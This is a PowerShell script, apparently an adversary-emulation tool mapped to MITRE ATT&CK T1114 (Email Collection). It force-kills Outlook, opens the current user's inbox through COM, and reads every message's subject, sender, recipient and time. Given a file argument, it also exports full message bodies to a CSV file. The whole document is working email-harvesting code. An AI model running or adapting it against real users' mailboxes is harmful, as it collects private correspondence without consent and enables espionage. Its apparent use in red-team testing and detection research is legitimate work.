<#
.SYNOPSIS
    
    Scrapes message data from the inbox of the current user and stores data in 'mail.csv' in the directory where the scrip was executed
    
    Outlook Email Collection
    MITRE ATT&CK - T1114
    Author: Greg Foss (@heinzarelli)
    Date: February, 2019
    License: BSD 3-Clause

.EXAMPLE

    Display email contents in the terminal    
    PS C:\> .\Get-Inbox.ps1

    Write emails out to a CSV
    PS C:\> .\Get-Inbox.ps1 -file "mail.csv"
#>

[CmdLetBinding()]
param( [string]$file )

function Kill-Outlook {

    # Check to see if outlook is running, and close it to scrape mail data programmatically
    $outlook = Get-Process -Name Outlook -ErrorAction SilentlyContinue
    if ($outlook) {
        $outlook.CloseMainWindow()
        Sleep 5
        if (!$outlook.HasExited) {
            $outlook | Stop-Process -Force > $null
        }
    }
    Remove-Variable outlook > $null
}

function Scrape-Outlook {

    # Connect to the local outlook inbox and read mail
    Add-type -assembly "Microsoft.Office.Interop.Outlook" | out-null
    $olFolders = "Microsoft.Office.Interop.Outlook.olDefaultFolders" -as [type]
    $inbox = new-object -comobject outlook.application
    $namespace = $inbox.GetNameSpace("MAPI")
    $folder = $namespace.getDefaultFolder($olFolders::olFolderInBox)
    Write-Output "Please be patient, this may take some time..."
    
    # Output the data
    if ( $file ) {
        $folder.items |
        Select-Object -Property Subject, ReceivedTime, SenderName, ReceivedByName, Body |
        Export-Csv -Path $file
    } else {
        $folder.items |
        Select-Object -Property Subject, ReceivedTime, SenderName, ReceivedByName
    }
}

Kill-Outlook > $null
Scrape-Outlook
Kill-Outlook > $null